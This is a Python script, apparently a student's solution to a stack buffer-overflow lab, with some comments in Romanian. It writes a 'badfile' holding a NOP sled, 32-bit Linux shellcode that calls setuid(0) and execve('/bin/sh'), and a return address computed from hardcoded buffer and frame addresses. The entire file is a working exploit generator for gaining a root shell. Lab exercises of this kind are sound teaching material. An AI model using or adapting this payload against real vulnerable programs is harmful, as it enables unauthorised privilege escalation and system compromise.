#!/usr/bin/python3
import sys

# Replace the content with the actual shellcode
shellcode= (
   "\x31\xdb"                  
    "\x6a\x17"                  
    "\x58"                     
    "\xcd\x80"                 
    "\xf7\xe3"                
    "\xb0\x0b"                 
    "\x31\xc9"                  
    "\x51"                       
    "\x68\x2f\x2f\x73\x68"       
    "\x68\x2f\x62\x69\x6e"       
    "\x89\xe3"                   
    "\xcd\x80"                   
).encode('latin-1')
# Fill the content with NOP's
content = bytearray(0x90 for i in range(517)) 
##################################################################
# Put the shellcode somewhere in the payload
start = 517 - len(shellcode)               # de la aceasta pozitie va fi pus shelcode-ul; la finalul bufferului
content[start:start + len(shellcode)] = shellcode
# Decide the return address value 
# and put it somewhere in the payload
buff = 0xffffc830                  #adresa bufferului 
ebp = 0xffffc8d8                   #adresa inscrisa in ebp
offset = ebp + 4 - buff             # diferenta dintre adresa de return (ebp+4) si adresa bufferului pentru adresa noua de retur
ret    = buff + start               # adresa de la care incepe shellcode-ul in buffer
L = 4                               # Use 4 for 32-bit address and 8 for 64-bit address
content[offset:offset + L] = (ret).to_bytes(L,byteorder='little') 
##################################################################
# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)
